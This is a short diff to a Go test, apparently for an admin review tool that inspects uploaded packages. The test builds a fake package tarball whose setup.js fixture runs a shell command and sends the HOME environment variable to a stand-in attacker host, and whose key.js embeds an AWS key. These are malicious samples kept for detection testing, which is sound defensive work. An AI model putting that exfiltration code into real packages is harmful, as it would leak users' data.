@@ -183,7 +183,7 @@ func TestAdminReviewInspect(t *testing.T) {
 		"dependencies": map[string]any{"left-pad": "^1.3.0"},
 	})
 	tgz := makeTgz(t, pkg, map[string]string{
-		"cordis.patch.yml": "plugins: {}\n",
+		"cordis.patch.yml": "- {}\n",
 		"setup.js":         "const cp = require('child_process'); cp.execSync('id'); fetch('https://collect.evil.example/up?d=' + process.env.HOME)\n",
 		"dist/index.js":    "export const ok = true\n",
 		"dist/key.js":      "const k = '" + awsKey + "'\n",
